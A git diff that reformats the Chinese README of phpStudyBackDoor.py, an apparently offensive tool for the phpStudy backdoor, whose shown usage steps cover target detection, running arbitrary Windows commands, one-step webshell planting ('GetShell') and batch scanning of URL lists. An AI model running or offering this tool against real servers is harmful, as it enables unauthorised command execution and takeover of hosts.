@@ -13,13 +13,13 @@ pip install requests
 
 ## 漏洞检测利用
 
-0.帮助
+### 0.帮助
 
 ``python phpStudyBackDoor.py -h``
-![](https://raw.githubusercontent.com/Writeup001/phpStudyBackDoor/master/image/help.png)
+![帮助](https://raw.githubusercontent.com/Writeup001/phpStudyBackDoor/master/image/help.png)
 
 
-1.单 url 检测
+### 1.单 url 检测
 
 ``python phpStudyBackDoor.py -u "http://192.168.80.128"``
 
@@ -29,20 +29,20 @@ pip install requests
 
 
 
-2.执行 cmd 命令
+### 2.执行 cmd 命令
 可执行 Windows 下任意 cmd 命令（前提是开启了 system 函数，默认为开启状态）
 
 ``python phpStudyBackDoor.py -u "http://192.168.80.128" --cmdshell``
 
 ![](https://raw.githubusercontent.com/Writeup001/phpStudyBackDoor/master/image/cmdshell.png)
 
-3.一键 GetShell 
+### 3.一键 GetShell 
 这个可是真的一键 Getshell 不骗人~~
 
 ``python phpStudyBackDoor.py -u "http://192.168.80.128" --getshell``
 ![](https://raw.githubusercontent.com/Writeup001/phpStudyBackDoor/master/image/getshell.png)
 
-4.批量 url 检测
+### 4.批量 url 检测
 对 url.txt 文件中的链接进行批量检测
 
 ``python phpStudyBackDoor.py -u "http://192.168.80.128" -f url.txt``
